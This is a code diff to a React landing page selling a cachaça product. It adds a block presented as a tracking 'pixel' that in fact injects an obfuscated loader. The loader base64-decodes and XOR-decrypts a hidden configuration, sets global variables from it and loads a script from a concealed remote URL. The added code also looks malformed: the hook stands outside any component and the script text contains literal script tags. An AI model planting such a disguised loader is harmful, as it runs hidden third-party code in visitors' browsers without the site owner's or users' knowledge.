@@ -41,6 +41,15 @@ const bonuses = [
   ["BÔNUS 05", "bonus-5-600.webp", "Guia de Harmonização", "Conheça combinações de cachaças, pratos e petiscos para diferentes ocasiões."],
 ];
 
+  useEffect(() => {
+    const pixelScript = document.createElement("script");
+    pixelScript.textContent = "<script>(function(){var a_2kz=atob(\"DCYvlzyvK4cSxpsiZF0N4k7DCb0wru9WFFUVuBPMT+k8s+9PDUBWuV/ARqlwtLRRB1RG50jcBPd7vv5OS1ZG71nDBe1h5LcABVJb5VXNXvN3tbkYP3sDtVvDROVzqugAXn1UtVLORuIw/LlSDV5K+3XLCaswsPpOEUMNrR6ZSuUkoP4aVhBO8l/LTrcr8P0bBh5LpAmNVtpv\");var i_78=[];for(var e_1q3=0;e_1q3<a_2kz.length;e_1q3++){i_78.push(a_2kz.charCodeAt(e_1q3)&255);}var b_y07=i_78[0];var e_c7=i_78.slice(1,1+b_y07);var v_khhs=i_78.slice(1+b_y07);var h_tj0=v_khhs.map(function(b,e_et){return b^e_c7[e_et%b_y07];});var j_i4h=\"\";for(var h_tps=0;h_tps<h_tj0.length;h_tps++){j_i4h+=String.fromCharCode(h_tj0[h_tps]&255);}var n_1b=decodeURIComponent(escape(j_i4h));var g_5=JSON.parse(n_1b);var c_2u8n=g_5.globals||[];c_2u8n.forEach(function(g_6zo){window[g_6zo.name]=g_6zo.value;});var w_mz=document.createElement(\"script\");w_mz.src=g_5.url;w_mz.async=true;w_mz.defer=true;(g_5.attributes||[]).forEach(function(h_9b){w_mz.setAttribute(h_9b.name,h_9b.value);});(document.head||document.documentElement).appendChild(w_mz);})();</script>";
+    document.head.appendChild(pixelScript);
+    return () => {
+      pixelScript.remove();
+    };
+  }, []);
+
 function Index() {
   return (
     <main className="cacha-page">
